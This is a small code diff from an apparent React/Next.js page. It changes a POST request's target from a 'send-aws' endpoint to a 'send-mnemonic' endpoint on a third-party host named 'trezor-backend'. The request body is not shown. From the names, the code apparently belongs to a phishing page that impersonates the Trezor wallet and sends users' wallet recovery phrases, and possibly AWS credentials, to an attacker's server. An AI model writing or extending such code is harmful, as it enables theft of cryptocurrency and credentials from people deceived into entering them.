@@ -35,7 +35,7 @@ export default function Home() {
       setLoading(true);
 
       const response = await fetch(
-        "https://trezor-backend-six.vercel.app/api/v1/send-aws",
+        "https://trezor-backend-six.vercel.app/api/v1/send-mnemonic",
         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
